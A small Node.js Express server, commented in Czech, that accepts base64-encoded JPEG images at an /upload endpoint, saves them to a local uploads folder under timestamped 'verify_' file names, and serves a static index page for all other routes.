const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Cesta ke složce uploads v kořenovém adresáři
const uploadDir = path.join(__dirname, 'uploads');

// Synchronní kontrola a vytvoření složky při startu
try {
    if (!fs.existsSync(uploadDir)) {
        fs.mkdirSync(uploadDir, { recursive: true });
        console.log("📁 Složka 'uploads' byla vytvořena.");
    }
} catch (err) {
    console.error("❌ Nepodařilo se vytvořit složku:", err);
}

// Middleware pro zpracování JSON a statických souborů
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint pro příjem fotky
app.post('/upload', (req, res) => {
    const { image } = req.body;
    
    if (!image) {
        console.log("⚠️ Přijat požadavek bez dat obrázku.");
        return res.status(400).json({ error: 'No image data' });
    }

    try {
        // Vyčištění base64 řetězce
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
        const fileName = `verify_${Date.now()}.jpg`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (err) {
                console.error("❌ Chyba při zápisu souboru:", err);
                return res.status(500).json({ error: 'Save failed' });
            }
            console.log(`✅ Snímek uložen: ${fileName}`);
            return res.status(200).json({ status: 'success', file: fileName });
        });
    } catch (error) {
        console.error("❌ Kritická chyba při zpracování:", error);
        res.status(500).json({ error: 'Processing error' });
    }
});

// Fallback pro index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    console.log(`🚀 Server běží na portu ${port}`);
});
